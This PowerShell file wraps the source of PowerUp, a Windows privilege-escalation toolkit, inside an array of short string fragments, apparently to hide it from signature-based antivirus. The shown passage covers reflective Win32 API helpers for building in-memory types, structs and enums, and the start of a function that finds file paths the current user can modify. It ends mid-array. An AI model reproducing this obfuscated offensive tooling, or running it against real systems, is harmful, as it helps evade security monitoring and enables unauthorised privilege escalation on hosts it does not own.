$fragments = @('<#

PowerUp ai','ms to be a cle','aringhouse of ','common Windows',' privilege esc','alation
vector','s that rely on',' misconfigurat','ions. See READ','ME.md for more',' information.
','
Author: @harm','j0y
License: B','SD 3-Clause
Re','quired Depende','ncies: None
Op','tional Depende','ncies: None

#','>

#Requires -','Version 2


##','##############','##############','##############','############
#','
# PSReflect c','ode for Window','s API access
#',' Author: @matt','ifestation
#  ',' https://raw.g','ithubuserconte','nt.com/mattife','station/PSRefl','ect/master/PSR','eflect.psm1
#
','##############','##############','##############','##############','

function New','-InMemoryModul','e {
<#
.SYNOPS','IS

Creates an',' in-memory ass','embly and modu','le

Author: Ma','tthew Graeber ','(@mattifestati','on)
License: B','SD 3-Clause
Re','quired Depende','ncies: None
Op','tional Depende','ncies: None

.','DESCRIPTION

W','hen defining c','ustom enums, s','tructs, and un','managed functi','ons, it is
nec','essary to asso','ciate to an as','sembly module.',' This helper f','unction
create','s an in-memory',' module that c','an be passed t','o the ''enum'',
','''struct'', and ','Add-Win32Type ','functions.

.P','ARAMETER Modul','eName

Specifi','es the desired',' name for the ','in-memory asse','mbly and modul','e. If
ModuleNa','me is not prov','ided, it will ','default to a G','UID.

.EXAMPLE','

$Module = Ne','w-InMemoryModu','le -ModuleName',' Win32
#>

   ',' [Diagnostics.','CodeAnalysis.S','uppressMessage','Attribute(''PSU','seShouldProces','sForStateChang','ingFunctions'',',' '''')]
    [Cmd','letBinding()]
','    Param (
  ','      [Paramet','er(Position = ','0)]
        [V','alidateNotNull','OrEmpty()]
   ','     [String]
','        $Modul','eName = [Guid]','::NewGuid().To','String()
    )','

    $AppDoma','in = [Reflecti','on.Assembly].A','ssembly.GetTyp','e(''System.AppD','omain'').GetPro','perty(''Current','Domain'').GetVa','lue($null, @()',')
    $LoadedA','ssemblies = $A','ppDomain.GetAs','semblies()

  ','  foreach ($As','sembly in $Loa','dedAssemblies)',' {
        if ','($Assembly.Ful','lName -and ($A','ssembly.FullNa','me.Split('','')[','0] -eq $Module','Name)) {
     ','       return ','$Assembly
    ','    }
    }

 ','   $DynAssembl','y = New-Object',' Reflection.As','semblyName($Mo','duleName)
    ','$Domain = $App','Domain
    $As','semblyBuilder ','= $Domain.Defi','neDynamicAssem','bly($DynAssemb','ly, ''Run'')
   ',' $ModuleBuilde','r = $AssemblyB','uilder.DefineD','ynamicModule($','ModuleName, $F','alse)

    ret','urn $ModuleBui','lder
}


# A h','elper function',' used to reduc','e typing while',' defining func','tion
# prototy','pes for Add-Wi','n32Type.
funct','ion func {
   ',' Param (
     ','   [Parameter(','Position = 0, ','Mandatory = $T','rue)]
        ','[String]
     ','   $DllName,

','        [Param','eter(Position ','= 1, Mandatory',' = $True)]
   ','     [string]
','        $Funct','ionName,

    ','    [Parameter','(Position = 2,',' Mandatory = $','True)]
       ',' [Type]
      ','  $ReturnType,','

        [Par','ameter(Positio','n = 3)]
      ','  [Type[]]
   ','     $Paramete','rTypes,

     ','   [Parameter(','Position = 4)]','
        [Runt','ime.InteropSer','vices.CallingC','onvention]
   ','     $NativeCa','llingConventio','n,

        [P','arameter(Posit','ion = 5)]
    ','    [Runtime.I','nteropServices','.CharSet]
    ','    $Charset,
','
        [Stri','ng]
        $E','ntryPoint,

  ','      [Switch]','
        $SetL','astError
    )','

    $Propert','ies = @{
     ','   DllName = $','DllName
      ','  FunctionName',' = $FunctionNa','me
        Ret','urnType = $Ret','urnType
    }
','
    if ($Para','meterTypes) { ','$Properties[''P','arameterTypes''','] = $Parameter','Types }
    if',' ($NativeCalli','ngConvention) ','{ $Properties[','''NativeCalling','Convention''] =',' $NativeCallin','gConvention }
','    if ($Chars','et) { $Propert','ies[''Charset'']',' = $Charset }
','    if ($SetLa','stError) { $Pr','operties[''SetL','astError''] = $','SetLastError }','
    if ($Entr','yPoint) { $Pro','perties[''Entry','Point''] = $Ent','ryPoint }

   ',' New-Object PS','Object -Proper','ty $Properties','
}


function ','Add-Win32Type
','{
<#
.SYNOPSIS','

Creates a .N','ET type for an',' unmanaged Win','32 function.

','Author: Matthe','w Graeber (@ma','ttifestation)
','License: BSD 3','-Clause
Requir','ed Dependencie','s: None
Option','al Dependencie','s: func

.DESC','RIPTION

Add-W','in32Type enabl','es you to easi','ly interact wi','th unmanaged (','i.e.
Win32 unm','anaged) functi','ons in PowerSh','ell. After pro','viding
Add-Win','32Type with a ','function signa','ture, a .NET t','ype is created','
using reflect','ion (i.e. csc.','exe is never c','alled like wit','h Add-Type).

','The ''func'' hel','per function c','an be used to ','reduce typing ','when defining
','multiple funct','ion definition','s.

.PARAMETER',' DllName

The ','name of the DL','L.

.PARAMETER',' FunctionName
','
The name of t','he target func','tion.

.PARAME','TER EntryPoint','

The DLL expo','rt function na','me. This argum','ent should be ','specified if t','he
specified f','unction name i','s different th','an the name of',' the exported
','function.

.PA','RAMETER Return','Type

The retu','rn type of the',' function.

.P','ARAMETER Param','eterTypes

The',' function para','meters.

.PARA','METER NativeCa','llingConventio','n

Specifies t','he native call','ing convention',' of the functi','on. Defaults t','o
stdcall.

.P','ARAMETER Chars','et

If you nee','d to explicitl','y call an ''A'' ','or ''W'' Win32 f','unction, you c','an
specify the',' character set','.

.PARAMETER ','SetLastError

','Indicates whet','her the callee',' calls the Set','LastError Win3','2 API
function',' before return','ing from the a','ttributed meth','od.

.PARAMETE','R Module

The ','in-memory modu','le that will h','ost the functi','ons. Use
New-I','nMemoryModule ','to define an i','n-memory modul','e.

.PARAMETER',' Namespace

An',' optional name','space to prepe','nd to the type','. Add-Win32Typ','e defaults
to ','a namespace co','nsisting only ','of the name of',' the DLL.

.EX','AMPLE

$Mod = ','New-InMemoryMo','dule -ModuleNa','me Win32

$Fun','ctionDefinitio','ns = @(
  (fun','c kernel32 Get','ProcAddress ([','IntPtr]) @([In','tPtr], [String',']) -Charset An','si -SetLastErr','or),
  (func k','ernel32 GetMod','uleHandle ([In','tptr]) @([Stri','ng]) -SetLastE','rror),
  (func',' ntdll RtlGetC','urrentPeb ([In','tPtr]) @())
)
','
$Types = $Fun','ctionDefinitio','ns | Add-Win32','Type -Module $','Mod -Namespace',' ''Win32''
$Kern','el32 = $Types[','''kernel32'']
$N','tdll = $Types[','''ntdll'']
$Ntdl','l::RtlGetCurre','ntPeb()
$ntdll','base = $Kernel','32::GetModuleH','andle(''ntdll'')','
$Kernel32::Ge','tProcAddress($','ntdllbase, ''Rt','lGetCurrentPeb',''')

.NOTES

In','spired by Lee ','Holmes'' Invoke','-WindowsApi ht','tp://poshcode.','org/2189

When',' defining mult','iple function ','prototypes, it',' is ideal to p','rovide
Add-Win','32Type with an',' array of func','tion signature','s. That way, t','hey
are all in','corporated int','o the same in-','memory module.','
#>

    [Outp','utType([Hashta','ble])]
    Par','am(
        [P','arameter(Manda','tory=$True, Va','lueFromPipelin','eByPropertyNam','e=$True)]
    ','    [String]
 ','       $DllNam','e,

        [P','arameter(Manda','tory=$True, Va','lueFromPipelin','eByPropertyNam','e=$True)]
    ','    [String]
 ','       $Functi','onName,

     ','   [Parameter(','ValueFromPipel','ineByPropertyN','ame=$True)]
  ','      [String]','
        $Entr','yPoint,

     ','   [Parameter(','Mandatory=$Tru','e, ValueFromPi','pelineByProper','tyName=$True)]','
        [Type',']
        $Ret','urnType,

    ','    [Parameter','(ValueFromPipe','lineByProperty','Name=$True)]
 ','       [Type[]',']
        $Par','ameterTypes,

','        [Param','eter(ValueFrom','PipelineByProp','ertyName=$True',')]
        [Ru','ntime.InteropS','ervices.Callin','gConvention]
 ','       $Native','CallingConvent','ion = [Runtime','.InteropServic','es.CallingConv','ention]::StdCa','ll,

        [','Parameter(Valu','eFromPipelineB','yPropertyName=','$True)]
      ','  [Runtime.Int','eropServices.C','harSet]
      ','  $Charset = [','Runtime.Intero','pServices.Char','Set]::Auto,

 ','       [Parame','ter(ValueFromP','ipelineByPrope','rtyName=$True)',']
        [Swi','tch]
        $','SetLastError,
','
        [Para','meter(Mandator','y=$True)]
    ','    [ValidateS','cript({($_ -is',' [Reflection.E','mit.ModuleBuil','der]) -or ($_ ','-is [Reflectio','n.Assembly])})',']
        $Mod','ule,

        ','[ValidateNotNu','ll()]
        ','[String]
     ','   $Namespace ','= ''''
    )

  ','  BEGIN
    {
','        $TypeH','ash = @{}
    ','}

    PROCESS','
    {
       ',' if ($Module -','is [Reflection','.Assembly])
  ','      {
      ','      if ($Nam','espace)
      ','      {
      ','          $Typ','eHash[$DllName','] = $Module.Ge','tType("$Namesp','ace.$DllName")','
            }','
            e','lse
          ','  {
          ','      $TypeHas','h[$DllName] = ','$Module.GetTyp','e($DllName)
  ','          }
  ','      }
      ','  else
       ',' {
           ',' # Define one ','type for each ','DLL
          ','  if (!$TypeHa','sh.ContainsKey','($DllName))
  ','          {
  ','              ','if ($Namespace',')
            ','    {
        ','            $T','ypeHash[$DllNa','me] = $Module.','DefineType("$N','amespace.$DllN','ame", ''Public,','BeforeFieldIni','t'')
          ','      }
      ','          else','
             ','   {
         ','           $Ty','peHash[$DllNam','e] = $Module.D','efineType($Dll','Name, ''Public,','BeforeFieldIni','t'')
          ','      }
      ','      }

     ','       $Method',' = $TypeHash[$','DllName].Defin','eMethod(
     ','           $Fu','nctionName,
  ','              ','''Public,Static',',PinvokeImpl'',','
             ','   $ReturnType',',
            ','    $Parameter','Types)

      ','      # Make e','ach ByRef para','meter an Out p','arameter
     ','       $i = 1
','            fo','reach($Paramet','er in $Paramet','erTypes)
     ','       {
     ','           if ','($Parameter.Is','ByRef)
       ','         {
   ','              ','   [void] $Met','hod.DefinePara','meter($i, ''Out',''', $null)
    ','            }
','
             ','   $i++
      ','      }

     ','       $DllImp','ort = [Runtime','.InteropServic','es.DllImportAt','tribute]
     ','       $SetLas','tErrorField = ','$DllImport.Get','Field(''SetLast','Error'')
      ','      $Calling','ConventionFiel','d = $DllImport','.GetField(''Cal','lingConvention',''')
           ',' $CharsetField',' = $DllImport.','GetField(''Char','Set'')
        ','    $EntryPoin','tField = $DllI','mport.GetField','(''EntryPoint'')','
            i','f ($SetLastErr','or) { $SLEValu','e = $True } el','se { $SLEValue',' = $False }

 ','           if ','($PSBoundParam','eters[''EntryPo','int'']) { $Expo','rtedFuncName =',' $EntryPoint }',' else { $Expor','tedFuncName = ','$FunctionName ','}

           ',' # Equivalent ','to C# version ','of [DllImport(','DllName)]
    ','        $Const','ructor = [Runt','ime.InteropSer','vices.DllImpor','tAttribute].Ge','tConstructor([','String])
     ','       $DllImp','ortAttribute =',' New-Object Re','flection.Emit.','CustomAttribut','eBuilder($Cons','tructor,
     ','           $Dl','lName, [Reflec','tion.PropertyI','nfo[]] @(), [O','bject[]] @(),
','              ','  [Reflection.','FieldInfo[]] @','($SetLastError','Field,
       ','              ','              ','        $Calli','ngConventionFi','eld,
         ','              ','              ','      $Charset','Field,
       ','              ','              ','        $Entry','PointField),
 ','              ',' [Object[]] @(','$SLEValue,
   ','              ','            ([','Runtime.Intero','pServices.Call','ingConvention]',' $NativeCallin','gConvention),
','              ','              ',' ([Runtime.Int','eropServices.C','harSet] $Chars','et),
         ','              ','      $Exporte','dFuncName))

 ','           $Me','thod.SetCustom','Attribute($Dll','ImportAttribut','e)
        }
 ','   }

    END
','    {
        ','if ($Module -i','s [Reflection.','Assembly])
   ','     {
       ','     return $T','ypeHash
      ','  }

        $','ReturnTypes = ','@{}

        f','oreach ($Key i','n $TypeHash.Ke','ys)
        {
','            $T','ype = $TypeHas','h[$Key].Create','Type()

      ','      $ReturnT','ypes[$Key] = $','Type
        }','

        retu','rn $ReturnType','s
    }
}


fu','nction psenum ','{
<#
.SYNOPSIS','

Creates an i','n-memory enume','ration for use',' in your Power','Shell session.','

Author: Matt','hew Graeber (@','mattifestation',')
License: BSD',' 3-Clause
Requ','ired Dependenc','ies: None
Opti','onal Dependenc','ies: None

.DE','SCRIPTION

The',' ''psenum'' func','tion facilitat','es the creatio','n of enums ent','irely in
memor','y using as clo','se to a "C sty','le" as PowerSh','ell will allow','.

.PARAMETER ','Module

The in','-memory module',' that will hos','t the enum. Us','e
New-InMemory','Module to defi','ne an in-memor','y module.

.PA','RAMETER FullNa','me

The fully-','qualified name',' of the enum.
','
.PARAMETER Ty','pe

The type o','f each enum el','ement.

.PARAM','ETER EnumEleme','nts

A hashtab','le of enum ele','ments.

.PARAM','ETER Bitfield
','
Specifies tha','t the enum sho','uld be treated',' as a bitfield','.

.EXAMPLE

$','Mod = New-InMe','moryModule -Mo','duleName Win32','

$ImageSubsys','tem = psenum $','Mod PE.IMAGE_S','UBSYSTEM UInt1','6 @{
    UNKNO','WN =          ','        0
    ','NATIVE =      ','             1',' # Image doesn','''t require a s','ubsystem.
    ','WINDOWS_GUI = ','             2',' # Image runs ','in the Windows',' GUI subsystem','.
    WINDOWS_','CUI =         ','     3 # Image',' runs in the W','indows charact','er subsystem.
','    OS2_CUI = ','              ','   5 # Image r','uns in the OS/','2 character su','bsystem.
    P','OSIX_CUI =    ','            7 ','# Image runs i','n the Posix ch','aracter subsys','tem.
    NATIV','E_WINDOWS =   ','        8 # Im','age is a nativ','e Win9x driver','.
    WINDOWS_','CE_GUI =      ','     9 # Image',' runs in the W','indows CE subs','ystem.
    EFI','_APPLICATION =','          10
 ','   EFI_BOOT_SE','RVICE_DRIVER =','  11
    EFI_R','UNTIME_DRIVER ','=       12
   ',' EFI_ROM =    ','              ','13
    XBOX = ','              ','      14
    W','INDOWS_BOOT_AP','PLICATION = 16','
}

.NOTES

Po','werShell puris','ts may disagre','e with the nam','ing of this fu','nction but
aga','in, this was d','eveloped in su','ch a way so as',' to emulate a ','"C style"
defi','nition as clos','ely as possibl','e. Sorry, I''m ','not going to n','ame it
New-Enu','m. :P
#>

    ','[OutputType([T','ype])]
    Par','am (
        [','Parameter(Posi','tion = 0, Mand','atory=$True)]
','        [Valid','ateScript({($_',' -is [Reflecti','on.Emit.Module','Builder]) -or ','($_ -is [Refle','ction.Assembly','])})]
        ','$Module,

    ','    [Parameter','(Position = 1,',' Mandatory=$Tr','ue)]
        [','ValidateNotNul','lOrEmpty()]
  ','      [String]','
        $Full','Name,

       ',' [Parameter(Po','sition = 2, Ma','ndatory=$True)',']
        [Typ','e]
        $Ty','pe,

        [','Parameter(Posi','tion = 3, Mand','atory=$True)]
','        [Valid','ateNotNullOrEm','pty()]
       ',' [Hashtable]
 ','       $EnumEl','ements,

     ','   [Switch]
  ','      $Bitfiel','d
    )

    i','f ($Module -is',' [Reflection.A','ssembly])
    ','{
        retu','rn ($Module.Ge','tType($FullNam','e))
    }

   ',' $EnumType = $','Type -as [Type',']

    $EnumBu','ilder = $Modul','e.DefineEnum($','FullName, ''Pub','lic'', $EnumTyp','e)

    if ($B','itfield)
    {','
        $Flag','sConstructor =',' [FlagsAttribu','te].GetConstru','ctor(@())
    ','    $FlagsCust','omAttribute = ','New-Object Ref','lection.Emit.C','ustomAttribute','Builder($Flags','Constructor, @','())
        $E','numBuilder.Set','CustomAttribut','e($FlagsCustom','Attribute)
   ',' }

    foreac','h ($Key in $En','umElements.Key','s)
    {
     ','   # Apply the',' specified enu','m type to each',' element
     ','   $null = $En','umBuilder.Defi','neLiteral($Key',', $EnumElement','s[$Key] -as $E','numType)
    }','

    $EnumBui','lder.CreateTyp','e()
}


# A he','lper function ','used to reduce',' typing while ','defining struc','t
# fields.
fu','nction field {','
    Param (
 ','       [Parame','ter(Position =',' 0, Mandatory=','$True)]
      ','  [UInt16]
   ','     $Position',',

        [Pa','rameter(Positi','on = 1, Mandat','ory=$True)]
  ','      [Type]
 ','       $Type,
','
        [Para','meter(Position',' = 2)]
       ',' [UInt16]
    ','    $Offset,

','        [Objec','t[]]
        $','MarshalAs
    ',')

    @{
    ','    Position =',' $Position
   ','     Type = $T','ype -as [Type]','
        Offse','t = $Offset
  ','      MarshalA','s = $MarshalAs','
    }
}


fun','ction struct
{','
<#
.SYNOPSIS
','
Creates an in','-memory struct',' for use in yo','ur PowerShell ','session.

Auth','or: Matthew Gr','aeber (@mattif','estation)
Lice','nse: BSD 3-Cla','use
Required D','ependencies: N','one
Optional D','ependencies: f','ield

.DESCRIP','TION

The ''str','uct'' function ','facilitates th','e creation of ','structs entire','ly in
memory u','sing as close ','to a "C style"',' as PowerShell',' will allow. S','truct
fields a','re specified u','sing a hashtab','le where each ','field of the s','truct
is compr','osed of the or','der in which i','t should be de','fined, its .NE','T
type, and op','tionally, its ','offset and spe','cial marshalin','g attributes.
','
One of the fe','atures of ''str','uct'' is that a','fter your stru','ct is defined,','
it will come ','with a built-i','n GetSize meth','od as well as ','an explicit
co','nverter so tha','t you can easi','ly cast an Int','Ptr to the str','uct without
re','lying upon cal','ling SizeOf an','d/or PtrToStru','cture in the M','arshal
class.
','
.PARAMETER Mo','dule

The in-m','emory module t','hat will host ','the struct. Us','e
New-InMemory','Module to defi','ne an in-memor','y module.

.PA','RAMETER FullNa','me

The fully-','qualified name',' of the struct','.

.PARAMETER ','StructFields

','A hashtable of',' fields. Use t','he ''field'' hel','per function t','o ease
definin','g each field.
','
.PARAMETER Pa','ckingSize

Spe','cifies the mem','ory alignment ','of fields.

.P','ARAMETER Expli','citLayout

Ind','icates that an',' explicit offs','et for each fi','eld will be sp','ecified.

.EXA','MPLE

$Mod = N','ew-InMemoryMod','ule -ModuleNam','e Win32

$Imag','eDosSignature ','= psenum $Mod ','PE.IMAGE_DOS_S','IGNATURE UInt1','6 @{
    DOS_S','IGNATURE =    ','0x5A4D
    OS2','_SIGNATURE =  ','  0x454E
    O','S2_SIGNATURE_L','E = 0x454C
   ',' VXD_SIGNATURE',' =    0x454C
}','

$ImageDosHea','der = struct $','Mod PE.IMAGE_D','OS_HEADER @{
 ','   e_magic =  ','  field 0 $Ima','geDosSignature','
    e_cblp = ','    field 1 UI','nt16
    e_cp ','=       field ','2 UInt16
    e','_crlc =     fi','eld 3 UInt16
 ','   e_cparhdr =','  field 4 UInt','16
    e_minal','loc = field 5 ','UInt16
    e_m','axalloc = fiel','d 6 UInt16
   ',' e_ss =       ','field 7 UInt16','
    e_sp =   ','    field 8 UI','nt16
    e_csu','m =     field ','9 UInt16
    e','_ip =       fi','eld 10 UInt16
','    e_cs =    ','   field 11 UI','nt16
    e_lfa','rlc =   field ','12 UInt16
    ','e_ovno =     f','ield 13 UInt16','
    e_res =  ','    field 14 U','Int16[] -Marsh','alAs @(''ByValA','rray'', 4)
    ','e_oemid =    f','ield 15 UInt16','
    e_oeminfo',' =  field 16 U','Int16
    e_re','s2 =     field',' 17 UInt16[] -','MarshalAs @(''B','yValArray'', 10',')
    e_lfanew',' =   field 18 ','Int32
}

# Exa','mple of using ','an explicit la','yout in order ','to create a un','ion.
$TestUnio','n = struct $Mo','d TestUnion @{','
    field1 = ','field 0 UInt32',' 0
    field2 ','= field 1 IntP','tr 0
} -Explic','itLayout

.NOT','ES

PowerShell',' purists may d','isagree with t','he naming of t','his function b','ut
again, this',' was developed',' in such a way',' so as to emul','ate a "C style','"
definition a','s closely as p','ossible. Sorry',', I''m not goin','g to name it
N','ew-Struct. :P
','#>

    [Outpu','tType([Type])]','
    Param (
 ','       [Parame','ter(Position =',' 1, Mandatory=','$True)]
      ','  [ValidateScr','ipt({($_ -is [','Reflection.Emi','t.ModuleBuilde','r]) -or ($_ -i','s [Reflection.','Assembly])})]
','        $Modul','e,

        [P','arameter(Posit','ion = 2, Manda','tory=$True)]
 ','       [Valida','teNotNullOrEmp','ty()]
        ','[String]
     ','   $FullName,
','
        [Para','meter(Position',' = 3, Mandator','y=$True)]
    ','    [ValidateN','otNullOrEmpty(',')]
        [Ha','shtable]
     ','   $StructFiel','ds,

        [','Reflection.Emi','t.PackingSize]','
        $Pack','ingSize = [Ref','lection.Emit.P','ackingSize]::U','nspecified,

 ','       [Switch',']
        $Exp','licitLayout
  ','  )

    if ($','Module -is [Re','flection.Assem','bly])
    {
  ','      return (','$Module.GetTyp','e($FullName))
','    }

    [Re','flection.TypeA','ttributes] $St','ructAttributes',' = ''AnsiClass,','
        Class',',
        Publ','ic,
        Se','aled,
        ','BeforeFieldIni','t''

    if ($E','xplicitLayout)','
    {
       ',' $StructAttrib','utes = $Struct','Attributes -bo','r [Reflection.','TypeAttributes',']::ExplicitLay','out
    }
    ','else
    {
   ','     $StructAt','tributes = $St','ructAttributes',' -bor [Reflect','ion.TypeAttrib','utes]::Sequent','ialLayout
    ','}

    $Struct','Builder = $Mod','ule.DefineType','($FullName, $S','tructAttribute','s, [ValueType]',', $PackingSize',')
    $Constru','ctorInfo = [Ru','ntime.InteropS','ervices.Marsha','lAsAttribute].','GetConstructor','s()[0]
    $Si','zeConst = @([R','untime.Interop','Services.Marsh','alAsAttribute]','.GetField(''Siz','eConst''))

   ',' $Fields = New','-Object Hashta','ble[]($StructF','ields.Count)

','    # Sort eac','h field accord','ing to the ord','ers specified
','    # Unfortun','ately, PSv2 do','esn''t have the',' luxury of the','
    # hashtab','le [Ordered] a','ccelerator.
  ','  foreach ($Fi','eld in $Struct','Fields.Keys)
 ','   {
        $','Index = $Struc','tFields[$Field','][''Position'']
','        $Field','s[$Index] = @{','FieldName = $F','ield; Properti','es = $StructFi','elds[$Field]}
','    }

    for','each ($Field i','n $Fields)
   ',' {
        $Fi','eldName = $Fie','ld[''FieldName''',']
        $Fie','ldProp = $Fiel','d[''Properties''',']

        $Of','fset = $FieldP','rop[''Offset'']
','        $Type ','= $FieldProp[''','Type'']
       ',' $MarshalAs = ','$FieldProp[''Ma','rshalAs'']

   ','     $NewField',' = $StructBuil','der.DefineFiel','d($FieldName, ','$Type, ''Public',''')

        if',' ($MarshalAs)
','        {
    ','        $Unman','agedType = $Ma','rshalAs[0] -as',' ([Runtime.Int','eropServices.U','nmanagedType])','
            i','f ($MarshalAs[','1])
          ','  {
          ','      $Size = ','$MarshalAs[1]
','              ','  $AttribBuild','er = New-Objec','t Reflection.E','mit.CustomAttr','ibuteBuilder($','ConstructorInf','o,
           ','         $Unma','nagedType, $Si','zeConst, @($Si','ze))
         ','   }
         ','   else
      ','      {
      ','          $Att','ribBuilder = N','ew-Object Refl','ection.Emit.Cu','stomAttributeB','uilder($Constr','uctorInfo, [Ob','ject[]] @($Unm','anagedType))
 ','           }

','            $N','ewField.SetCus','tomAttribute($','AttribBuilder)','
        }

  ','      if ($Exp','licitLayout) {',' $NewField.Set','Offset($Offset',') }
    }

   ',' # Make the st','ruct aware of ','its own size.
','    # No more ','having to call',' [Runtime.Inte','ropServices.Ma','rshal]::SizeOf','!
    $SizeMet','hod = $StructB','uilder.DefineM','ethod(''GetSize',''',
        ''Pu','blic, Static'',','
        [Int]',',
        [Typ','e[]] @())
    ','$ILGenerator =',' $SizeMethod.G','etILGenerator(',')
    # Thanks',' for the help,',' Jason Shirk!
','    $ILGenerat','or.Emit([Refle','ction.Emit.OpC','odes]::Ldtoken',', $StructBuild','er)
    $ILGen','erator.Emit([R','eflection.Emit','.OpCodes]::Cal','l,
        [Ty','pe].GetMethod(','''GetTypeFromHa','ndle''))
    $I','LGenerator.Emi','t([Reflection.','Emit.OpCodes]:',':Call,
       ',' [Runtime.Inte','ropServices.Ma','rshal].GetMeth','od(''SizeOf'', [','Type[]] @([Typ','e])))
    $ILG','enerator.Emit(','[Reflection.Em','it.OpCodes]::R','et)

    # All','ow for explici','t casting from',' an IntPtr
   ',' # No more hav','ing to call [R','untime.Interop','Services.Marsh','al]::PtrToStru','cture!
    $Im','plicitConverte','r = $StructBui','lder.DefineMet','hod(''op_Implic','it'',
        ''','PrivateScope, ','Public, Static',', HideBySig, S','pecialName'',
 ','       $Struct','Builder,
     ','   [Type[]] @(','[IntPtr]))
   ',' $ILGenerator2',' = $ImplicitCo','nverter.GetILG','enerator()
   ',' $ILGenerator2','.Emit([Reflect','ion.Emit.OpCod','es]::Nop)
    ','$ILGenerator2.','Emit([Reflecti','on.Emit.OpCode','s]::Ldarg_0)
 ','   $ILGenerato','r2.Emit([Refle','ction.Emit.OpC','odes]::Ldtoken',', $StructBuild','er)
    $ILGen','erator2.Emit([','Reflection.Emi','t.OpCodes]::Ca','ll,
        [T','ype].GetMethod','(''GetTypeFromH','andle''))
    $','ILGenerator2.E','mit([Reflectio','n.Emit.OpCodes',']::Call,
     ','   [Runtime.In','teropServices.','Marshal].GetMe','thod(''PtrToStr','ucture'', [Type','[]] @([IntPtr]',', [Type])))
  ','  $ILGenerator','2.Emit([Reflec','tion.Emit.OpCo','des]::Unbox_An','y, $StructBuil','der)
    $ILGe','nerator2.Emit(','[Reflection.Em','it.OpCodes]::R','et)

    $Stru','ctBuilder.Crea','teType()
}


#','##############','##############','##############','#############
','#
# PowerUp He','lpers
#
######','##############','##############','##############','########

func','tion Get-Modif','iablePath {
<#','
.SYNOPSIS

Pa','rses a passed ','string contain','ing multiple p','ossible file/f','older paths an','d returns
the ','file paths whe','re the current',' user has modi','fication right','s.

Author: Wi','ll Schroeder (','@harmj0y)  
Li','cense: BSD 3-C','lause  
Requir','ed Dependencie','s: None  

.DE','SCRIPTION

Tak','es a complex p','ath specificat','ion of an init','ial file/folde','r path with po','ssible
configu','ration files, ','''tokenizes'' th','e string in a ','number of poss','ible ways, and','
enumerates th','e ACLs for eac','h path that cu','rrently exists',' on the system','. Any path tha','t
the current ','user has modif','ication rights',' on is returne','d in a custom ','object that co','ntains
the mod','ifiable path, ','associated per','mission set, a','nd the Identit','yReference wit','h the specifie','d
rights. The ','SID of the cur','rent user and ','any group he/s','he are a part ','of are used as',' the
compariso','n set against ','the parsed pat','h DACLs.

.PAR','AMETER Path

T','he string path',' to parse for ','modifiable fil','es. Required

','.PARAMETER Lit','eral

Switch. ','Treat all path','s as literal (','i.e. don''t do ','''tokenization''',').

.EXAMPLE

','''"C:\Temp\blah','.exe" -f "C:\T','emp\config.ini','"'' | Get-Modif','iablePath

Pat','h             ','          Perm','issions       ','         Ident','ityReference
-','---           ','            --','---------     ','           ---','--------------','
C:\Temp\blah.','exe           ','{ReadAttribute','s, ReadCo... N','T AUTHORITY\Au','thentic...
C:\','Temp\config.in','i         {Rea','dAttributes, R','eadCo... NT AU','THORITY\Authen','tic...

.EXAMP','LE

Get-ChildI','tem C:\Vuln\ -','Recurse | Get-','ModifiablePath','

Path        ','              ',' Permissions  ','              ','IdentityRefere','nce
----      ','              ','   -----------','              ','  ------------','-----
C:\Vuln\','blah.bat      ','     {ReadAttr','ibutes, ReadCo','... NT AUTHORI','TY\Authentic..','.
C:\Vuln\conf','ig.ini        ',' {ReadAttribut','es, ReadCo... ','NT AUTHORITY\A','uthentic...
..','.

.OUTPUTS

P','owerUp.TokenPr','ivilege.Modifi','ablePath

Cust','om PSObject co','ntaining the P','ermissions, Mo','difiablePath, ','IdentityRefere','nce for
a modi','fiable path.
#','>

    [Diagno','stics.CodeAnal','ysis.SuppressM','essageAttribut','e(''PSShouldPro','cess'', '''')]
  ','  [OutputType(','''PowerUp.Modif','iablePath'')]
 ','   [CmdletBind','ing()]
    Par','am(
        [P','arameter(Posit','ion = 0, Manda','tory = $True, ','ValueFromPipel','ine = $True, V','alueFromPipeli','neByPropertyNa','me = $True)]
 ','       [Alias(','''FullName'')]
 ','       [String','[]]
        $P','ath,

        ','[Alias(''Litera','lPaths'')]
    ','    [Switch]
 ','       $Litera','l
    )

    B','EGIN {
       ',' # from http:/','/stackoverflow','.com/questions','/28029872/retr','ieving-securit','y-descriptor-a','nd-getting-num','ber-for-filesy','stemrights
   ','     $AccessMa','sk = @{
      ','      [uint32]','''0x80000000'' =',' ''GenericRead''','
            [','uint32]''0x4000','0000'' = ''Gener','icWrite''
     ','       [uint32',']''0x20000000'' ','= ''GenericExec','ute''
         ','   [uint32]''0x','10000000'' = ''G','enericAll''
   ','         [uint','32]''0x02000000',''' = ''MaximumAl','lowed''
       ','     [uint32]''','0x01000000'' = ','''AccessSystemS','ecurity''
     ','       [uint32',']''0x00100000'' ','= ''Synchronize','''
            ','[uint32]''0x000','80000'' = ''Writ','eOwner''
      ','      [uint32]','''0x00040000'' =',' ''WriteDAC''
  ','          [uin','t32]''0x0002000','0'' = ''ReadCont','rol''
         ','   [uint32]''0x','00010000'' = ''D','elete''
       ','     [uint32]''','0x00000100'' = ','''WriteAttribut','es''
          ','  [uint32]''0x0','0000080'' = ''Re','adAttributes''
','            [u','int32]''0x00000','040'' = ''Delete','Child''
       ','     [uint32]''','0x00000020'' = ','''Execute/Trave','rse''
         ','   [uint32]''0x','00000010'' = ''W','riteExtendedAt','tributes''
    ','        [uint3','2]''0x00000008''',' = ''ReadExtend','edAttributes''
','            [u','int32]''0x00000','004'' = ''Append','Data/AddSubdir','ectory''
      ','      [uint32]','''0x00000002'' =',' ''WriteData/Ad','dFile''
       ','     [uint32]''','0x00000001'' = ','''ReadData/List','Directory''
   ','     }

      ','  $UserIdentit','y = [System.Se','curity.Princip','al.WindowsIden','tity]::GetCurr','ent()
        ','$CurrentUserSi','ds = $UserIden','tity.Groups | ','Select-Object ','-ExpandPropert','y Value
      ','  $CurrentUser','Sids += $UserI','dentity.User.V','alue
        $','TranslatedIden','tityReferences',' = @{}
    }

','    PROCESS {
','
        ForEa','ch($TargetPath',' in $Path) {

','            $C','andidatePaths ','= @()

       ','     # possibl','e separator ch','aracter combin','ations
       ','     $Separati','onCharacterSet','s = @(''"'', "''"',', '' '', "`"''", ','''" '', "'' ", "`','"'' ")

       ','     if ($PSBo','undParameters[','''Literal'']) {
','
             ','   $TempPath =',' $([System.Env','ironment]::Exp','andEnvironment','Variables($Tar','getPath))

   ','             i','f (Test-Path -','Path $TempPath',' -ErrorAction ','SilentlyContin','ue) {
        ','            $C','andidatePaths ','+= Resolve-Pat','h -Path $TempP','ath | Select-O','bject -ExpandP','roperty Path
 ','              ',' }
           ','     else {
